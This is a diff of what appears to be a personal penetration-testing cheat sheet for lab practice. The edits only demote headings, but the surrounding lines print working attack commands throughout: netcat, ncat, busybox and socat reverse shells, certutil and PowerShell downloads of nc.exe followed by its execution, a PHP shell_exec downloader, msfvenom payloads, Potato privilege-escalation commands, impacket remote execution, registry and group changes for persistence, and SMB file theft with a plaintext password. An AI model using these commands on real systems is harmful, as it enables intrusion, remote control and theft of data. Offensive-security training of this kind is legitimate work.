 
-### PHP reverse shell
+#### PHP reverse shell
 
 (Full original pentestmonkey code preserved here exactly as you provided.)
 
@@ -1874,19 +1874,19 @@ mkfifo /tmp/f; nc YOUR_HTB_IP 4444 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f
 ?page=phar:///var/www/html/uploads/archive.phar/test.txt
 ```
 
-## ncat
+### ncat
 
 ```jsx
 ncat -e /bin/bash 192.168.1.44 1234
 ```
 
-## BusyBox
+### BusyBox
 
 ```jsx
 http://plan.bitforge.lab/www//upload/files/5hjchl/u69.php?cmd=busybox%20nc%20192.168.45.159%203306%20-e%20bash
 ```
 
-## Socat Upgrade
+### Socat Upgrade
 
 ```jsx
 socat file:`tty`,raw,echo=0 tcp-listen:4444 -->attacker
@@ -1894,15 +1894,15 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444 -->attacker
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.227:4444 --> victim
 ```
 
-## LibreOffice revshell ODT
+### LibreOffice revshell ODT
 
 ```jsx
 https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc
 ```
 
-## Upgrade Through Python Server
+### Upgrade Through Python Server
 
-### **linux**
+#### **linux**
 
 ```jsx
 cat <<EOF > rev.sh
@@ -1917,7 +1917,7 @@ then from the rev shell type
 bash rev.sh
 ```
 
-## RCE → Rev shell
+### RCE → Rev shell
 
 ```jsx
 pyhon3 poc.py <ip> "curl http://<your-ip>/shell.sh -o /tmp/shell.sh"
@@ -1925,7 +1925,7 @@ python3 poc.py <ip> "chmod +x /tmp/shell.sh"
 python3 poc.py <ip> "/tmp/shell.sh"
 ```
 
-### windows
+#### windows
 
 ```jsx
 certutil -urlcache -split -f http://192.168.45.159:80/nc.exe C:/Users/Public/Documents/nc.exe
@@ -1935,7 +1935,7 @@ certutil -urlcache -split -f http://192.168.45.159:80/nc.exe C:/Users/Public/Doc
 cmd.exe /c C:/Users/Public/Documents/nc.exe -e cmd.exe 192.168.45.159 4444
 ```
 
-## WordPress
+### WordPress
 
 ```jsx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.150 LPORT=4444 -f exe -o 64.exe
@@ -2143,13 +2143,13 @@ echo '</pre>';
 
 on clicking update we get a shell lol
 
-## Revshell one liner —> downloads nxc and executes it in pwned directory
+### Revshell one liner —> downloads nxc and executes it in pwned directory
 
 ```jsx
 $command = shell_exec('mkdir c:\pwn && powershell.exe wget "http://192.168.45.179/nc.exe" -outfile "c:\pwn\nc.exe" && c:\pwn\nc.exe -e cmd.exe 192.168.45.179 9997');
 ```
 
-## Magic Shell
+### Magic Shell
 
 ```markdown
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -2159,15 +2159,15 @@ stty columns 200 rows 200
 export TERM=xterm
 ```
 
-# 7. File Transfer
+## 7. File Transfer
 
-### Transferring with nxc
+#### Transferring with nxc
 
 ```jsx
 nxc smb 192.168.113.160 -u 'o.foller' -p 'EarlyMorningFootball777' --get-file "Users\\z.thomas\\Downloads\\Onboarding Document.docx" output.docx
 ```
 
-### Transferring with SMB
+#### Transferring with SMB
 
 ```
 On host
@@ -2178,7 +2178,7 @@ net use \\\\10.10.10.10.\\share  /USER:test
 copy \\\\10.10.10.10.\\share\\*
 ```
 
-### Transferring with NC
+#### Transferring with NC
 
 ```
 on kali
@@ -2190,19 +2190,19 @@ nc 10.10.14.82 9001 < 2026-2-9.log.zip
 do md5sum filenmame bothways to verify content
 ```
 
-### Transferring with scp
+#### Transferring with scp
 
 ```jsx
 scp /path/to/local/file username@remote_host:/path/to/remote/directory
 ```
 
-## Powershell
+### Powershell
 
 ```jsx
 EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.119.147:9999/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe'
 ```
 
-## If inside a pivot
+### If inside a pivot
 
 ```jsx
 listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
@@ -2238,11 +2238,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.135.206 LPORT=53 -f exe -
 
 ```
 
-# MISC
+## MISC
 
-## Client Side Attacks
+### Client Side Attacks
 
-### Library
+#### Library
 
 For this attack, we have to set up a WebDAV server, a Python3 web server, a Netcat listener, and prepare the Windows Library and shortcut files.
 
@@ -2324,19 +2324,19 @@ Password: dqsTwTpZPn#nL
 
 Now wait.
 
-## Executing phar rev shell
+### Executing phar rev shell
 
 ```jsx
 ?page=phar:///var/www/html/uploads/archive.phar/test.txt
 ```
 
-## LFI to RCE
+### LFI to RCE
 
 ```jsx
 https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a
 ```
 
-## Using Arson
+### Using Arson
 
 ```jsx
 docker-compose up -d
@@ -2399,7 +2399,7 @@ The Ars0n Framework v2 Scan Data Repository contains real-world scan data that y
     Reconnaissance Methodology: The systematic approach to bug bounty huntin
 ```
 
-## Persistence
+### Persistence
 
 Adding our user to work with nxc later on
 
@@ -2437,11 +2437,11 @@ impacket-psexec fatcat:'fatcat1234'@192.168.139.189
 impacket-wmiexec fatcat:'fatcat1234'@192.168.139.189
 ```
 
-# Potatoes
+## Potatoes
 
 https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
-## SigmaPotato
+### SigmaPotato
 
 ```jsx
 # Execute a Command
@@ -2457,7 +2457,7 @@ https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 ./SigmaPotato.exe 'cmd /c C:\Users\Public\Documents\nc64.exe 192.168.45.152 1222 =e cmd.exe
 ```
 
-## JuicyPotato
+### JuicyPotato
 
 ```jsx
 **msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.45.159 LPORT=1338 -f exe -o shell.exe
@@ -2477,7 +2477,7 @@ wuauserv is good choice
 
 ```
 
-## GodPotato
+### GodPotato
 
 Check machine net version
 
@@ -2544,7 +2544,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 net localgroup "Remote Management Users" "YOURDOMAIN\Username" /add
 ```
 
-## Setting up mysql server
+### Setting up mysql server
 
 1. Install MySQL/MariaDB
 
@@ -2603,4 +2603,4 @@ sudo systemctl restart mariadb
     ```
 
 
-## Sweet Potato
+### Sweet Potato
